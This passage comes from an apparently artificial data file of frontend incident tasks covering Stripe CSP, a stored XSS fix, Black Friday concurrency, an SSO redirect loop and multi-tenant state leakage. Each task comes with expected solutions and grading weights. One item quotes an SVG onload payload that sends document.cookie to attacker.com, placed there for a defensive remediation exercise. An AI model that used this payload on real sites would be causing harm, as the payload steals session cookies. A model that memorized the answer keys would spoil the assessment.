        successCriteria: ['Card input fields render cleanly without CSP errors', 'Payment token generated and submitted to backend'],
        evaluationCriteria: { migrationExecution: 50, securityCompliance: 50 }
      }
    ],
    decisionPoints: ['Strict domain CSP allowlist vs wildcard', 'Custom card form vs unified hosted element'],
    pressureEvents: ['Compliance deadline: PCI auditor reviewing live production environment in 2 hours'],
    expectedSolution: 'Add https://*.stripe.com to frame-src and script-src CSP; refactor component to await stripe.elements().mount().',
    acceptableApproaches: ['Modern Stripe Elements v3 migration pattern', 'Async script loader with Promise wrapper'],
    failureConditions: ['CSP relaxed to unsafe-inline or wildcard *', 'Form allows submission before card iframe finishes loading'],
    finalDeliverable: 'Modernized PaymentElement.jsx passing PCI-DSS CSP compliance with active payment processing.',
    evaluationCriteria: { sdkIntegration: 40, securityHygiene: 30, testValidation: 30 },
    workplaceContext: 'Mission-Critical Payment SDK Migration',
    taskType: 'sdk_migration'
  },

  {
    id: 'FE-L4-005',
    title: 'Emergency Client-Side XSS Vulnerability & CSP Lockdown',
    role: 'frontend',
    level: 4,
    difficulty: 'Critical Incident',
    company: 'Twitter / Web Security Engineering',
    department: 'AppSec & Core Web Client',
    domain: 'Social Media / Platform Security',
    skills: ['security', 'xss_prevention', 'content_security_policy', 'sanitization'],
    coreCompetencies: ['appsec', 'xss_remediation', 'csp_enforcement'],
    secondarySkills: ['dompurify', 'trusted_types'],
    skillTags: ['xss', 'security', 'cve', 'dompurify', 'csp', 'critical'],
    situation: 'A security researcher submitted a critical bug bounty report demonstrating Stored XSS in the user bio component, allowing attackers to hijack active user sessions via malicious SVG tags.',
    problem: 'User bio rendering uses dangerouslySetInnerHTML without sanitization, and the application lacks a Content Security Policy (CSP) header to prevent inline script execution.',
    mission: 'Sanitize all user-generated HTML using DOMPurify, eliminate dangerouslySetInnerHTML in favor of structured text, and implement a strict nonce-based Content Security Policy.',
    workspace: {
      tools: ['slack', 'editor', 'browser', 'terminal'],
      environment: { runtime: 'React 18 / DOMPurify 3.0' }
    },
    availableEvidence: [
      'Bug Bounty Proof-of-Concept: <svg onload="fetch(\'https://attacker.com/steal?cookie=\'+document.cookie)"> executes in user bio',
      'CVSS Severity: 9.6 (Critical Stored XSS)'
    ],
    subtasks: [
      {
        id: 'FE-L4-005-S1',
        title: 'Reproduce Stored XSS Exploit in Sandbox Environment',
        objective: 'Inject proof-of-concept payload into UserBio component and observe unauthorized alert/fetch execution.',
        instructions: 'Open browser preview, input the security researcher PoC into bio editor, and observe un-sanitized script execution in console.',
        expectedActions: ['Input PoC SVG payload in bio field', 'Verify un-sanitized script execution in preview'],
        successCriteria: ['Confirmed Stored XSS vulnerability', 'Identified vulnerable dangerouslySetInnerHTML usage'],
        evaluationCriteria: { exploitReproduction: 50, securityAnalysis: 50 }
      },
      {
        id: 'FE-L4-005-S2',
        title: 'Integrate DOMPurify Sanitizer & Strict CSP Headers',
        objective: 'Wrap HTML in DOMPurify.sanitize with strict tag allowlist and enforce default-src \'self\' CSP.',
        instructions: 'Update UserBio.jsx to sanitize with DOMPurify, strip all inline event handlers, and add CSP meta tag with object-src \'none\'.',
        expectedActions: ['Import and configure DOMPurify.sanitize()', 'Add strict CSP header to index.html', 'Verify PoC payload renders harmlessly as plain text'],
        successCriteria: ['Exploit payload completely neutralized', 'CSP blocks any attempted external script injection'],
        evaluationCriteria: { sanitizationCompleteness: 50, cspHardening: 50 }
      }
    ],
    decisionPoints: ['Strip HTML entirely vs allow safe formatting tags (b, i, a)', 'Nonce-based CSP vs hash-based CSP'],
    pressureEvents: ['Head of Security: "Bug bounty report published in 4 hours. We must patch and verify immediately."'],
    expectedSolution: 'Sanitize with DOMPurify.sanitize(bioText, { ALLOWED_TAGS: [\'b\', \'i\', \'a\'], ALLOWED_ATTR: [\'href\'] }), enforce strict CSP.',
    acceptableApproaches: ['DOMPurify with restricted tag/attribute whitelist', 'Replacing HTML rendering with React markdown parser'],
    failureConditions: ['Event handlers like onload or onerror still execute', 'CSP allows unsafe-inline scripts without nonce'],
    finalDeliverable: 'Hardened UserBio.jsx and strict Content Security Policy eliminating XSS vectors.',
    evaluationCriteria: { securityHardening: 40, preventionQuality: 30, testValidation: 30 },
    workplaceContext: 'Critical Emergency Application Security Response',
    taskType: 'security'
  },

  {
    id: 'FE-L4-006',
    title: 'Black Friday High-Concurrency Render Pipeline Freeze',
    role: 'frontend',
    level: 4,
    difficulty: 'Critical Incident',
    company: 'Amazon / Black Friday Command Center',
    department: 'Core Retail Experience',
    domain: 'E-Commerce / High-Concurrency Events',
    skills: ['resilience', 'traffic_shedding', 'optimistic_degradation', 'react_concurrency'],
    coreCompetencies: ['concurrency_management', 'graceful_degradation', 'traffic_shedding'],
    secondarySkills: ['use_deferred_value', 'suspense'],
    skillTags: ['black_friday', 'high_concurrency', 'traffic_shed', 'react_18', 'resilience'],
    situation: 'During Black Friday opening hour (120,000 requests/sec), customer shopping carts freeze as price-drop notifications overwhelm the client store with 50 updates per second.',
    problem: 'React 18 synchronous state updates cause the browser thread to lock up for 4 seconds during lightning deal updates, preventing customers from clicking the Buy Now button.',
    mission: 'Implement React 18 Concurrent transitions (useTransition / useDeferredValue) and an optimistic degradation mode that throttles non-essential live notifications.',
    workspace: {
      tools: ['slack', 'editor', 'browser', 'terminal'],
      environment: { runtime: 'React 18 Concurrent Mode' }
    },
    availableEvidence: [
      'Command Center telemetry: 38,000 abandoned carts due to frozen Buy Now buttons',
      'DevTools: Long tasks averaging 4,200ms of non-interruptible React reconciliation'
    ],
    subtasks: [
      {
        id: 'FE-L4-006-S1',
        title: 'Diagnose Synchronous Re-render Choke in High-Traffic Stream',
        objective: 'Simulate high-velocity price update event storm and observe Buy Now button unresponsive delay.',
        instructions: 'Open preview, start "Black Friday Traffic Storm" simulation, and measure time from button click to UI response.',
        expectedActions: ['Run lightning deal traffic storm in preview', 'Observe 4-second input latency on Buy button'],
        successCriteria: ['Measured severe input delay under concurrent state updates', 'Identified urgent need for concurrent priority separation'],
        evaluationCriteria: { diagnosticSpeed: 50, concurrencyInsight: 50 }
      },
      {
        id: 'FE-L4-006-S2',
        title: 'Implement useTransition & Graceful Notification Shedding',
        objective: 'Mark price notifications as non-urgent transitions and prioritize user purchase clicks with highest priority.',
        instructions: 'Wrap live notification state updates in startTransition(), use useDeferredValue for catalog feeds, and verify Buy button responds instantaneously.',
        expectedActions: ['Refactor state updates with useTransition', 'Prioritize Buy Now click handler', 'Verify input latency drops below 50ms during peak storm'],
        successCriteria: ['Buy Now button responds in < 50ms during 100 updates/sec storm', 'Zero main thread freezes'],
        evaluationCriteria: { concurrentArchitecture: 50, testPassage: 50 }
      }
    ],
    decisionPoints: ['Dropping background notifications vs deferring with useTransition', 'WebSocket downsampling at edge vs client-side throttling'],
    pressureEvents: ['VP of Retail: Every second of freeze costs $320,000. Prioritize the checkout button over everything else.'],
    expectedSolution: 'Wrap non-urgent background stream updates in startTransition(() => setDeals(newDeals)); keep checkout button action immediate.',
    acceptableApproaches: ['React 18 useTransition for background updates', 'Worker-based notification throttling with high-priority UI main thread'],
    failureConditions: ['Checkout button remains locked during deals influx', 'Prices displayed to customer differ from final charged price'],
    finalDeliverable: 'LightningDeals.jsx maintaining sub-50ms user responsiveness during high-volume event storm.',
    evaluationCriteria: { resilienceDesign: 40, performanceUnderLoad: 30, testVerification: 30 },
    workplaceContext: 'High-Volume Retail Event Concurrency Emergency',
    taskType: 'concurrency'
  },

  {
    id: 'FE-L4-007',
    title: 'Global Single Sign-On (SSO) Auth Outage & Callback Loop',
    role: 'frontend',
    level: 4,
    difficulty: 'Critical Incident',
    company: 'Salesforce / Enterprise Identity Cloud',
    department: 'Identity & Access Engineering',
    domain: 'Enterprise SaaS / SSO & IAM',
    skills: ['auth_security', 'oauth2_pkce', 'session_management', 'routing'],
    coreCompetencies: ['identity_management', 'oauth_debugging', 'crisis_resolution'],
    secondarySkills: ['pkce_verification', 'url_sanitization'],
    skillTags: ['sso', 'oauth2', 'pkce', 'infinite_loop', 'session_outage'],
    situation: 'Enterprise users across 400 corporate tenants are trapped in an infinite login redirect loop (URL flickers between /auth/callback and /login 50 times in 5 seconds).',
    problem: 'OAuth2 PKCE authorization code verifier is wiped from sessionStorage by aggressive multi-tab synchronization, causing callback verification to fail and loop back to login.',
    mission: 'Fix PKCE verifier state persistence, add redirect loop detection threshold (max 3 attempts), and provide clear fallback authentication instructions.',
    workspace: {
      tools: ['slack', 'editor', 'browser', 'terminal'],
      environment: { runtime: 'React 18 / OAuth2 PKCE SDK' }
    },
    availableEvidence: [
      'Customer support: "12,000 employees at Boeing unable to log in to CRM this morning"',
      'Browser console: Loop detected: 32 redirects between /login and /callback in 2.8s'
    ],
    subtasks: [
      {
        id: 'FE-L4-007-S1',
        title: 'Trace PKCE State Collision & Infinite Redirect Loop',
        objective: 'Reproduce multi-tab login flow in preview and trace sessionStorage PKCE verifier deletion.',
        instructions: 'Open preview with simulated dual-tab login, observe state parameter mismatch error, and trace infinite loop redirect.',
        expectedActions: ['Simulate dual-tab login in preview', 'Identify PKCE code_verifier deletion bug in AuthCallback.jsx'],
        successCriteria: ['Reproduced redirect loop in sandbox', 'Pinpointed missing state persistence and absent loop guard'],
        evaluationCriteria: { oauthDiagnosis: 50, rootCauseDetail: 50 }
      },
      {
        id: 'FE-L4-007-S2',
        title: 'Deploy Tab-Scoped Storage & Circuit-Breaker Loop Guard',
        objective: 'Store PKCE verifier keyed by state UUID, implement max-redirects circuit breaker, and show helpful error banner.',
        instructions: 'Update AuthCallback.jsx to look up verifier by state parameter, break loop after 2 failed attempts, and offer manual retry.',
        expectedActions: ['Key code_verifier by OAuth state parameter in storage', 'Add redirect loop counter guard (break if count > 2)', 'Verify clean login recovery'],
        successCriteria: ['Infinite redirect loop eliminated completely', 'Enterprise users authenticate successfully on first attempt'],
        evaluationCriteria: { implementationSecurity: 50, testPassage: 50 }
      }
    ],
    decisionPoints: ['SessionStorage vs in-memory cookie storage for PKCE', 'Hard stop on failure vs fallback to username/password'],
    pressureEvents: ['Major enterprise customer threatening contract cancellation due to morning employee lockout'],
    expectedSolution: 'Key code_verifier by state parameter in storage (pkce_${state}), check redirect count in sessionStorage to break loop if > 2.',
    acceptableApproaches: ['State-keyed sessionStorage with loop threshold', 'HttpOnly cookie-backed PKCE state verification'],
    failureConditions: ['User still loops infinitely on invalid code', 'Security check bypassed allowing unverified code exchange'],
    finalDeliverable: 'Hardened AuthCallback.jsx with state-keyed PKCE verification and redirect loop circuit breaker.',
    evaluationCriteria: { securityArchitecture: 40, reliability: 30, testValidation: 30 },
    workplaceContext: 'Global Enterprise Single Sign-On Outage',
    taskType: 'identity_security'
  },

  {
    id: 'FE-L4-008',
    title: 'Production Multi-Tenant Data Leakage in Client State Store',
    role: 'frontend',
    level: 4,
    difficulty: 'Critical Incident',
    company: 'Zendesk / Multi-Tenant Customer Support UI',
    department: 'Platform Security & Data Privacy',
    domain: 'Enterprise SaaS / Multi-Tenant Security',
    skills: ['data_privacy', 'security', 'state_management', 'cache_isolation'],
    coreCompetencies: ['tenant_isolation', 'data_privacy', 'state_purging'],
    secondarySkills: ['redux_store_reset', 'react_context'],
    skillTags: ['multi_tenant', 'data_leak', 'gdpr', 'state_purge', 'critical_security'],
    situation: 'Support agents switching between tenant workspaces (e.g. from Tenant A to Tenant B) can briefly see customer ticket data and PII from Tenant A for 800ms.',
    problem: 'Client-side state store (Redux/Zustand) is not purged upon workspace switch. Stale cached entities from the previous tenant remain in memory until new queries resolve.',
    mission: 'Implement an atomic global state purge on workspace switch, enforce tenant-scoped cache partitioning, and verify zero cross-tenant data retention.',
    workspace: {
      tools: ['slack', 'editor', 'browser', 'terminal'],
      environment: { runtime: 'React 18 / Zustand / QueryClient' }
    },
    availableEvidence: [
      'Critical Security Incident Ticket: Support agent in Tenant #402 reported seeing credit card numbers of Tenant #401',
      'GDPR Breach Notification clock: 72-hour regulatory investigation underway'
    ],
    subtasks: [
      {
        id: 'FE-L4-008-S1',
        title: 'Audit In-Memory State Retention on Workspace Switch',
        objective: 'Switch between tenants in browser preview and inspect residual customer PII in memory.',
        instructions: 'Open preview, switch from Acme Corp to Beta Inc, and inspect Redux/Zustand store snapshot before new data arrives.',
        expectedActions: ['Switch workspace context in preview', 'Verify previous tenant customer data persists in store snapshot'],
        successCriteria: ['Documented cross-tenant data leak window (800ms)', 'Isolated missing store reset action on route change'],
        evaluationCriteria: { securityAudit: 50, leakVerification: 50 }
      },
      {
        id: 'FE-L4-008-S2',
        title: 'Architect Atomic Store Purge & Tenant Cache Partitioning',
        objective: 'Dispatch RESET_TENANT_STATE on workspace change and key all cache queries by tenantId.',
        instructions: 'Update WorkspaceContext.jsx and store.js to wipe all entity caches, reset queryClient, and display tenant boundary loading state.',
        expectedActions: ['Implement atomic store purge on tenantId change', 'Clear React Query cache for previous tenant', 'Verify zero residual data in memory during transition'],
        successCriteria: ['100% of previous tenant state wiped atomically before next render', 'Zero PII leak in memory heap or UI'],
        evaluationCriteria: { isolationRigorousness: 50, testPassage: 50 }
      }
    ],
    decisionPoints: ['Total in-memory store reset vs tenant-keyed namespaced sub-stores', 'Full-page reload on tenant switch vs SPA state wipe'],
    pressureEvents: ['Legal team notice: A single proven instance of cross-tenant PII exposure triggers mandatory GDPR reporting'],
    expectedSolution: 'Dispatch global RESET action wiping all stores, call queryClient.clear(), and render blank tenant boundary until new tenant hydrates.',
    acceptableApproaches: ['Atomic store reset action with root reducer override', 'Partitioning store under state.tenants[activeTenantId] with immediate unmount'],
    failureConditions: ['Residual customer data visible during loading transition', 'Network cache returns cached data from previous tenant'],
    finalDeliverable: 'WorkspaceContext.jsx and store.js with atomic tenant isolation and zero PII cross-contamination.',
    evaluationCriteria: { dataIsolation: 40, securityCompliance: 30, testValidation: 30 },
    workplaceContext: 'Multi-Tenant Enterprise Security & Data Isolation',
    taskType: 'security_data_privacy'
  }
];
